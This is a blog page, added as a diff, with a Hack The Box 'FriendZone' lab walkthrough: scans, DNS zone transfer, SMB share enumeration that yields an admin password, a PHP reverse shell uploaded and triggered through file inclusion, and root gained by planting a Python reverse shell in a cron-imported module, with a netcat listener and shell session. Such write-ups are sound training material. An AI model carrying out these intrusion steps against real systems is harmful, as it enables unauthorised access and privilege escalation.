@@ -1,0 +1,509 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no">
+
+    
+      <link rel="icon" href="/favicon.png" />
+    
+
+    <title>
+        
+          Hack The Box - FriendZone - DiegoExploit
+        
+    </title>
+    <style>
+  #carbonads {
+    border: 1px solid black;
+    border-radius: 7px;
+    border-spacing: 7px;
+    display: block;
+    overflow: hidden;
+    padding: 1em;
+    line-height: 1.5;
+  }
+  #carbonads span {
+    position: relative;
+    display: block;
+    overflow: hidden;
+  }
+  .carbon-img {
+    float: left;
+    margin-right: 1em;
+  }
+  .carbon-img img {
+    display: block;
+  }
+  .carbon-text {
+    display: block;
+    float: left;
+    max-width: calc(100% - 130px - 1em);
+    text-align: left;
+  }
+  .carbon-poweredby {
+    position: absolute;
+    left: 142px;
+    bottom: 0;
+    display: block;
+    font-size: .8em;
+    line-height: 1;
+    letter-spacing: 1px;
+    }
+    </style>
+    <!-- Spectre.css framework -->
+    <link rel="stylesheet" href="https://unpkg.com/spectre.css/dist/spectre.min.css">
+    <link rel="stylesheet" href="https://unpkg.com/spectre.css/dist/spectre-exp.min.css">
+    <link rel="stylesheet" href="https://unpkg.com/spectre.css/dist/spectre-icons.min.css">
+
+    <!-- theme css & js -->
+    
+<link rel="stylesheet" href="/css/book.css">
+
+    
+<script src="/js/book.js"></script>
+
+
+    <!-- tocbot -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.min.js"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.css">
+    
+    <!-- katex -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+
+    
+<!-- Google Tag Manager -->
+<script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
+new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
+j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
+'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
+})(window,document,'script','dataLayer','GTM-P385GSF');</script>
+<!-- End Google Tag Manager -->
+<!-- Google Tag Manager (noscript) -->
+<noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-P385GSF"
+height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
+<!-- End Google Tag Manager (noscript) -->
+    
+<script src="https://cdnjs.cloudflare.com/ajax/libs/zooming/2.1.1/zooming.min.js"></script>
+<script>
+document.addEventListener('DOMContentLoaded', function () {
+    const zooming = new Zooming()
+    zooming.listen('.book-content img')
+})
+</script>
+
+    <style>
+      #htbbadge{
+        float: left;
+      }
+    </style>
+<meta name="generator" content="Hexo 4.2.0"><link rel="alternate" href="/feed.xml" title="DiegoExploit" type="application/rss+xml">
+</head>
+
+<body>
+
+<div class="book-container">
+  <div class="book-sidebar">
+    <div class="book-brand">
+  <a href="/">
+    <img src="/favicon.png">
+    <span>DiegoExploit</span>
+  </a>
+</div>
+    <div class="book-menu">
+  <ul>
+<li><a href="/">Home</a></li>
+</ul>
+<h1 id="Categories Windows"><a href="#Categories Windows" class="headerlink" title="Categories Windows"></a>Categories Windows</h1><h2 id="Hack-The-Box-"><a href="#Hack-The-Box-" class="headerlink" title="Hack The Box"></a>Hack The Box </h2><ul>
+<li><a href="/hack-the-box/legacy/">1. Hack The Box - Legacy</a></li>
+<li><a href="/hack-the-box/devel/">2. Hack The Box - Devel</a></li>
+<li><a href="/hack-the-box/optimum/">3. Hack The Box - Optimum</a></li>
+<li><a href="/hack-the-box/bastard/">4. Hack The Box - Bastard</a></li>
+<li><a href="/hack-the-box/artic/">5. Hack The Box - Artic</a></li>
+<li><a href="/hack-the-box/grandpa/">6. Hack The Box - Grandpa</a></li>
+<li><a href="/hack-the-box/granny/">7. Hack The Box - Granny</a></li>
+<li><a href="/hack-the-box/blue/">8. Hack The Box - Blue</a></li>
+<li><a href="/hack-the-box/silo/">9. Hack The Box - Silo</a></li>
+<li><a href="/hack-the-box/bounty/">10. Hack The Box - Bounty</a></li>
+<li><a href="/hack-the-box/jerry/">11. Hack The Box - Jerry</a></li>
+<li><a href="/hack-the-box/conceal/">12. Hack The Box - Conceal</a></li>
+<li><a href="/hack-the-box/chatterbox/">13. Hack The Box - Chatterbox</a></li>
+<li><a href="/hack-the-box/forest/">14. Hack The Box - Forest</a></li>
+<li><a href="/hack-the-box/bankrobber/">15. Hack The Box - BkRobber</a></li>
+<li><a href="/hack-the-box/secnotes/">16. Hack The Box - Secnotes</a></li>
+<li><a href="/hack-the-box/bastion/">17. Hack The Box - Bastion</a></li>
+
+</ul>
+<h1 id="Categories Linux"><a href="#Categories Linux" class="headerlink" title="Categories Linux"></a>Categories Linux</h1><h2 id="Hack-The-Box-"><a href="#Hack-The-Box-" class="headerlink" title="Hack The Box"></a>Hack The Box </h2><ul>
+<li><a href="/hack-the-box/lame/">1. Hack The Box - Lame</a></li>
+<li><a href="/hack-the-box/popcorn/">2. Hack The Box - Popcorn</a></li>
+<li><a href="/hack-the-box/beep/">3. Hack The Box - Beep</a></li>
+<li><a href="/hack-the-box/tenten/">4. Hack The Box - Tenten</a></li>
+<li><a href="/hack-the-box/cronos/">5. Hack The Box - Cronos</a></li>
+<li><a href="/hack-the-box/brainfuck/">6. Hack The Box - brainfuck</a></li>
+<li><a href="/hack-the-box/shocker/">6. Hack The Box - Shocker</a></li>
+<li><a href="/hack-the-box/bashed/">7. Hack The Box - Bashed</a></li>
+<li><a href="/hack-the-box/nibbles/">8. Hack The Box - Nibbles</a></li>
+<li><a href="/hack-the-box/nineveh/">9. Hack The Box - Nineveh</a></li>
+<li><a href="/hack-the-box/sense/">10. Hack The Box - Sense</a></li>
+<li><a href="/hack-the-box/solidstate/">11. Hack The Box - SolidState</a></li>
+<li><a href="/hack-the-box/kotarak/">12. Hack The Box - Kotarak</a></li>
+<li><a href="/hack-the-box/node/">13. Hack The Box - Node</a></li>
+<li><a href="/hack-the-box/valentine/">14. Hack The Box - Valentine</a></li>
+<li><a href="/hack-the-box/poison/">15. Hack The Box - Poison</a></li>
+<li><a href="/hack-the-box/sunday/">16. Hack The Box - Sunday</a></li>
+<li><a href="/hack-the-box/TartaSauce/">17. Hack The Box - TartaSauce</a></li>
+<li><a href="/hack-the-box/friendzone/">18. Hack The Box - Friendzone</a></li>
+<li><a href="/hack-the-box/swagshop/">19. HTB- SwagShop</a></li>
+<li><a href="/hack-the-box/jarvis/">20. Hack The Box Jarvis</a></li>
+</ul>
+
+
+
+
+</div>
+
+
+<script src="/js/book-menu.js"></script>
+
+  </div>
+
+  <div class="off-canvas-content">
+    <div class="columns">
+      <div class="column col-10 col-lg-12">
+        <div class="book-navbar">
+          <!-- For Responsive Layout -->
+
+<header class="navbar">
+  <section class="navbar-section">
+    <a onclick="open_sidebar()">
+      <i class="icon icon-menu"></i>
+    </a>
+  </section>
+</header>
+
+        </div>
+        <div class="book-content">
+          <div class="book-post">
+  <br>
+  <h1 id="Hack-The-Box-FriendZone"><a href="#Hack-The-Box-FriendZone" class="headerlink" title="Hack The Box - FriendZone"></a>Hack The Box - FriendZone</h1><h2 id="Quick-Summary"><a href="#Quick-Summary" class="headerlink" title="Quick Summary"></a>Quick Summary</h2><p>FriendZone is an easy difficulty Linux box which needs fair amount enumeration. By doing a zone transfer vhosts are discovered. There are open shares on samba which provides credentials for an admin panel. From there, an LFI is found which is leveraged to get RCE. A cron is found running which uses a writable module, making it vulnerable to hijacking. Its IP address is <code>10.10.10.123</code> Let’s go to hack!!!<br><img src="/images/hackthebox/exploit/FriendZone/0.png" alt=""></p>
+<h2 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h2>
+<p>As always we will start with <code>nmap</code> to scan for open ports and services, previously launched a nmap basic scan to all ports, the output was the  21,22,53,80,139,443,445 open ports:
+<pre><figure class="highlight plain"> |-------(root@kali)-------|(/opt/ghidra)
+ |                                                                                                                                                                            
+ |-->{SFire129}#nmap -p 21,22,53,80,139,443,445 -sV -sC --script vuln  10.10.10.123                                                                                          
+ Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-10 09:04 EDT
+ Nmap scan report for 10.10.10.123
+ Host is up (0.17s latency).
+ 
+ PORT    STATE SERVICE     VERSION
+ 21/tcp  open  ftp         vsftpd 3.0.3
+ |_clamav-exec: ERROR: Script execution failed (use -d to debug)
+ |_sslv2-drown: 
+ 22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
+ |_clamav-exec: ERROR: Script execution failed (use -d to debug)
+ 53/tcp  open  domain      ISC BIND 9.11.3-1ubuntu1.2 (Ubuntu Linux)
+ |_clamav-exec: ERROR: Script execution failed (use -d to debug)
+ 80/tcp  open  http        Apache httpd 2.4.29 ((Ubuntu))
+ |_clamav-exec: ERROR: Script execution failed (use -d to debug)
+ |_http-csrf: Couldn't find any CSRF vulnerabilities.
+ |_http-dombased-xss: Couldn't find any DOM based XSS.
+ | http-enum: 
+ |   /wordpress/: Blog
+ |_  /robots.txt: Robots file
+ |_http-server-header: Apache/2.4.29 (Ubuntu)
+ |_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
+ | vulners: 
+ |   cpe:/a:apache:http_server:2.4.29: 
+ |       CVE-2019-0211   7.2     https://vulners.com/cve/CVE-2019-0211
+ |       CVE-2018-1312   6.8     https://vulners.com/cve/CVE-2018-1312
+ |       CVE-2017-15715  6.8     https://vulners.com/cve/CVE-2017-15715
+ |       CVE-2019-10082  6.4     https://vulners.com/cve/CVE-2019-10082
+ |       CVE-2019-0217   6.0     https://vulners.com/cve/CVE-2019-0217
+ |       CVE-2020-1927   5.8     https://vulners.com/cve/CVE-2020-1927
+ |       CVE-2019-10098  5.8     https://vulners.com/cve/CVE-2019-10098
+ |       CVE-2020-1934   5.0     https://vulners.com/cve/CVE-2020-1934
+ |       CVE-2019-10081  5.0     https://vulners.com/cve/CVE-2019-10081
+ |       CVE-2019-0220   5.0     https://vulners.com/cve/CVE-2019-0220
+ |       CVE-2019-0196   5.0     https://vulners.com/cve/CVE-2019-0196
+ |       CVE-2018-17199  5.0     https://vulners.com/cve/CVE-2018-17199
+ |       CVE-2018-1333   5.0     https://vulners.com/cve/CVE-2018-1333
+ |       CVE-2017-15710  5.0     https://vulners.com/cve/CVE-2017-15710
+ |       CVE-2019-0197   4.9     https://vulners.com/cve/CVE-2019-0197
+ |       CVE-2019-10092  4.3     https://vulners.com/cve/CVE-2019-10092
+ |       CVE-2018-11763  4.3     https://vulners.com/cve/CVE-2018-11763
+ |_      CVE-2018-1283   3.5     https://vulners.com/cve/CVE-2018-1283
+ 139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+ |_clamav-exec: ERROR: Script execution failed (use -d to debug)
+ 443/tcp open  ssl/http    Apache httpd 2.4.29
+ |_clamav-exec: ERROR: Script execution failed (use -d to debug)
+ |_http-csrf: Couldn't find any CSRF vulnerabilities.
+ |_http-dombased-xss: Couldn't find any DOM based XSS.
+ |_http-server-header: Apache/2.4.29 (Ubuntu)
+ |_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
+ |_sslv2-drown: 
+ | vulners: 
+ |   cpe:/a:apache:http_server:2.4.29: 
+ |       CVE-2019-0211   7.2     https://vulners.com/cve/CVE-2019-0211
+ |       CVE-2018-1312   6.8     https://vulners.com/cve/CVE-2018-1312
+ |       CVE-2017-15715  6.8     https://vulners.com/cve/CVE-2017-15715
+ |       CVE-2019-10082  6.4     https://vulners.com/cve/CVE-2019-10082
+ |       CVE-2019-0217   6.0     https://vulners.com/cve/CVE-2019-0217
+ |       CVE-2020-1927   5.8     https://vulners.com/cve/CVE-2020-1927
+ |       CVE-2019-10098  5.8     https://vulners.com/cve/CVE-2019-10098
+ |       CVE-2020-1934   5.0     https://vulners.com/cve/CVE-2020-1934
+ |       CVE-2019-10081  5.0     https://vulners.com/cve/CVE-2019-10081
+ |       CVE-2019-0220   5.0     https://vulners.com/cve/CVE-2019-0220
+ |       CVE-2019-0196   5.0     https://vulners.com/cve/CVE-2019-0196
+ |       CVE-2018-17199  5.0     https://vulners.com/cve/CVE-2018-17199
+ |       CVE-2018-1333   5.0     https://vulners.com/cve/CVE-2018-1333
+ |       CVE-2017-15710  5.0     https://vulners.com/cve/CVE-2017-15710
+ |       CVE-2019-0197   4.9     https://vulners.com/cve/CVE-2019-0197
+ |       CVE-2019-10092  4.3     https://vulners.com/cve/CVE-2019-10092
+ |       CVE-2018-11763  4.3     https://vulners.com/cve/CVE-2018-11763
+ |_      CVE-2018-1283   3.5     https://vulners.com/cve/CVE-2018-1283
+ 445/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+ |_clamav-exec: ERROR: Script execution failed (use -d to debug)
+ Service Info: Hosts: FRIENDZONE, 127.0.0.1; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+ 
+ Host script results:
+ |_smb-vuln-ms10-054: false
+ |_smb-vuln-ms10-061: false
+ | smb-vuln-regsvc-dos: 
+ |   VULNERABLE:
+ |   Service regsvc in Microsoft Windows systems vulnerable to denial of service
+ |     State: VULNERABLE
+ |       The service regsvc in Microsoft Windows 2000 systems is vulnerable to denial of service caused by a null deference
+ |       pointer. This script will crash the service if it is vulnerable. This vulnerability was discovered by Ron Bowes
+ |       while working on smb-enum-sessions.
+ |_          
+ 
+ Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+ Nmap done: 1 IP address (1 host up) scanned in 868.23 seconds</figure></pre>
+  <h2 id="Enumeration"><a href="#Enumeration" class="Enumeration" title="Enumeration"></a>Enumeration</h2>
+ <p>Browse on web service:
+ <img src="/images/hackthebox/exploit/FriendZone/1.png" alt=""></p>
+ <p>The web service on HTTPS service:
+ <img src="/images/hackthebox/exploit/FriendZone/3.png" alt=""></p>
+ <p>The SSL certificated show the domain name friendzone.red.
+ <img src="/images/hackthebox/exploit/FriendZone/2.png" alt=""></p>
+<p>The source code web page show another domain, friendzoneportal.red
+ <img src="/images/hackthebox/exploit/FriendZone/3.1.png" alt=""></p>
+ <p>With the gobuster reveal some submdomain.
+ <img src="/images/hackthebox/exploit/FriendZone/4.png" alt=""></p>
+ <p>In the dashboard web page.
+ <p>With the gobuster reveal some submdomain.
+ <img src="/images/hackthebox/exploit/FriendZone/5.png" alt=""></p>
+ <p>Enumerate dns for search subdomain <code>dig axfr @10.10.10.123 friendzone.red</code>
+ <img src="/images/hackthebox/exploit/FriendZone/7.png" alt=""></p>
+ <p>Add the domains to file hosts. and mix with the domain friendzoneportal.
+ <pre><figure class="highlight plain"> |-------(root@kali)-------|(~/HackTheBox/friendzone)
+ |                                                                                                                                                                                       
+ |-->{SFire129}#cat zonatransfer | grep friendzone | awk '{print $1}' | sort -u
+ ;
+ admin.friendzoneportal.red.
+ files.friendzoneportal.red.
+ friendzoneportal.red.
+ imports.friendzoneportal.red.
+ vpn.friendzoneportal.red.</figure></pre>
+ 
+ <img src="/images/hackthebox/exploit/FriendZone/9.png" alt=""></p>
+ <p>Add subdomain to /etc/hosts file.
+  <img src="/images/hackthebox/exploit/FriendZone/8.png" alt=""></p>
+  <p>Another web page admin.
+ <img src="/images/hackthebox/exploit/FriendZone/10.png" alt=""></p>
+ <p>Enumerate the SMB service:
+ <pre><figure class="highlight plain"> |-------(root@kali)-------|(~)
+ |
+ |-->{SFire129}#smbmap -H 10.10.10.123
+ [+] Guest session       IP: 10.10.10.123:445    Name: friendzone.red                                    
+         Disk                                                    Permissions     Comment
+         ----                                                    -----------     -------
+         print$                                                  NO ACCESS       Printer Drivers
+         Files                                                   NO ACCESS       FriendZone Samba Server Files /etc/Files
+         general                                                 READ ONLY       FriendZone Samba Server Files
+         Development                                             READ, WRITE     FriendZone Samba Server Files
+         IPC$                                                    NO ACCESS       IPC Service (FriendZone server (Samba, Ubuntu))
+ |-------(root@kali)-------|(~)
+ |
+ |-->{SFire129}#smbmap -H 10.10.10.123 -R --depth 5
+ [+] Guest session       IP: 10.10.10.123:445    Name: friendzone.red                                    
+         Disk                                                    Permissions     Comment
+         ----                                                    -----------     -------
+         print$                                                  NO ACCESS       Printer Drivers
+         Files                                                   NO ACCESS       FriendZone Samba Server Files /etc/Files
+         general                                                 READ ONLY       FriendZone Samba Server Files
+         .\general\*
+         dr--r--r--                0 Wed Jan 16 15:10:51 2019    .
+         dr--r--r--                0 Wed Jan 23 16:51:02 2019    ..
+         fr--r--r--               57 Tue Oct  9 19:52:42 2018    creds.txt
+         Development                                             READ, WRITE     FriendZone Samba Server Files
+         .\Development\*
+         dr--r--r--                0 Fri Jul 10 13:18:31 2020    .
+         dr--r--r--                0 Wed Jan 23 16:51:02 2019    ..
+         IPC$ </figure></pre>
+<p>The smb service reveal user/password information.
+  <pre><figure class="highlight plain"> |-------(root@kali)-------|(~/HackTheBox/friendzone)
+ |                                                                                                                                                                                       
+ |-->{SFire129}#smbclient  //10.10.10.123/general                                                                                                                                        
+ Enter WORKGROUP\root's password: 
+ Try "help" to get a list of possible commands.
+ smb: \> get creds.txt
+ getting file \creds.txt of size 57 as creds.txt (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)
+ smb: \> exit
+ |-------(root@kali)-------|(~/HackTheBox/friendzone)
+ |                                                                                                                                                                                       
+ |-->{SFire129}#ls                                                                                                                                                                       
+ creds.txt
+ |-------(root@kali)-------|(~/HackTheBox/friendzone)
+ |                                                                                                                                                                                       
+ |-->{SFire129}#cat creds.txt                                                                                                                                                            
+ creds for the admin THING:
+ 
+ admin:WORKWORKHhallelujah@#</figure></pre>
+		   <h2 id="Exploit"><a href="#Exploit" class="Exploit" title="Exploit"></a>Exploit</h2>
+ <p>With php-reverse-shell.php modify with own data connection:
+ <img src="/images/hackthebox/exploit/FriendZone/11.png" alt=""></p> 
+ <p>Upload the php-reverse-shell.php for reverse connection with shortly name, in this case rev.php.
+ <pre><figure class="highlight plain"> |-------(root@kali)-------|(~/HackTheBox/friendzone)
+ |                                                                                                                                                                                       
+ |-->{SFire129}#smbclient //10.10.10.123/Development                                                                                                                                     
+ Enter WORKGROUP\root's password: 
+ Try "help" to get a list of possible commands.
+ smb: \> put rev.php
+ putting file rev.php as \rev.php (10.3 kb/s) (average 10.3 kb/s)
+ smb: \> ls
+   .                                   D        0  Fri Jul 10 16:34:12 2020
+   ..                                  D        0  Wed Jan 23 16:51:02 2019
+   rev.php                             A     5493  Fri Jul 10 16:34:12 2020
+ 
+                 9221460 blocks of size 1024. 6336632 blocks available
+ smb: \> </figure></pre>
+<p>Run the URL in the target system with netcat listener. NOTE: remember the image 5, whitch has url for exploit the target.
+ <img src="/images/hackthebox/exploit/FriendZone/13.png" alt=""></p>
+ <p>Browsing in the system reveal information about the connection chain on mysql.
+  <img src="/images/hackthebox/exploit/FriendZone/14.png" alt=""></p>
+ <p>Run the LinEnum.sh script, show a file with RWX permissions.
+   <img src="/images/hackthebox/exploit/FriendZone/14.1.png" alt=""></p>
+  <p>Download the <code>psp64</code> for monitoring process.
+ <img src="/images/hackthebox/exploit/FriendZone/15.png" alt=""></p>
+ <p>The output show the running process.
+ <img src="/images/hackthebox/exploit/FriendZone/15.1.png" alt=""></p>
+    <h2 id="Get_privileges"><a href="#Get_privileges" class="Get_privileges" title="Get_privileges"></a>Get_privileges</h2>
+ <p>Add the reverse python shell to file <code>/usr/lib/python2.7/os.py</code>
+ <img src="/images/hackthebox/exploit/FriendZone/17.png" alt=""></p>
+ <p>Run the netcat listener on port 4242 and waiting for.
+ <img src="/images/hackthebox/exploit/FriendZone/18.png" alt=""></p>
+  <h2 id="Capture-The-Flag"><a href="#Capture-The-Flag" class="Capture-The-Flag" title="Capture-The-Flag"></a>Capture The Flag</h2>
+ <pre><figure class="highlight plain">  |-------(root@kali)-------|(~)
+ |                                                                                                                                                                                       
+ |-->{SFire129}#nc -nlvp 4242                                                                                                                                                            
+ 
+ # 
+ # ls
+ certs  root.txt
+ # ls
+ friend
+ # cd friend
+ # ls
+ user.txt
+ # cat user.txt
+ ***Here you could find the user flag***
+ # cat /root.txt
+ cat: /root.txt: No such file or directory
+ # cd ..
+ # ls
+ friend
+ # cd ..
+ # ls
+ bin   home            lib64       opt   sbin      tmp      vmlinuz.old
+ boot  initrd.img      lost+found  proc  srv       usr
+ dev   initrd.img.old  media       root  swapfile  var
+ etc   lib             mnt         run   sys       vmlinuz
+ # cd root
+  # cat root.txt
+ ***Here you could find the root flag***
+ # 
+  </figure></pre>
+ 
+<p> And we owned root !</p>
+</div>
+
+
+  <div class="book-comments">
+    
+
+
+
+
+  </div>
+
+
+
+<script src="/js/book-post.js"></script>
+
+        </div>
+      </div>
+      <div class="column col-2 hide-lg">
+        <div class="book-post-info">
+  
+    <div class="book-post-meta">
+
+  <div class="author">
+
+    <!-- Author image -->
+    <div class="author-img">
+      
+        <figure class="avatar avatar-lg">
+          <img src="/avatar.png" alt="...">
+        </figure>
+      
+    </div>
+
+    <!-- Author title -->
+    <div class="author-title">
+      <div>DiegoExploit</div>
+      <div>2020-07-12</div>
+    </div>
+  </div>
+
+  
+    <div class="divider"></div>
+
+    <div class="link">
+      <a class="category-link" href="/categories/hack-the-box/">hack-the-box</a>
+
+      <a class="tag-link" href="/tags/linux/" rel="tag">#Linux</a> <a class="tag-link" href="/tags/sqli/" rel="tag">#ReversePython</a> <a class="tag-link" href="/tags/ssh/" rel="tag">#</a>
+    </div>
+    
+  
+
+  <div class="divider"></div>
+</div>
+  
+
+  <div class="book-tocbot">
+</div>
+<div class="book-tocbot-menu">
+  <a class="book-toc-expand" onclick="expand_toc()">Expand all</a>
+  <a onclick="go_top()">Back to top</a>
+  <a onclick="go_bottom()">Go to bottom</a>
+</div>
+
+
+<script src="/js/book-toc.js"></script>
+
+</div>
+      </div>
+    </div>
+  </div>
+  
+  <a class="off-canvas-overlay" onclick="hide_canvas()"></a>
+</div>
+
+</body>
+</html>
+
+
+<script src="/js/book.js"></script>
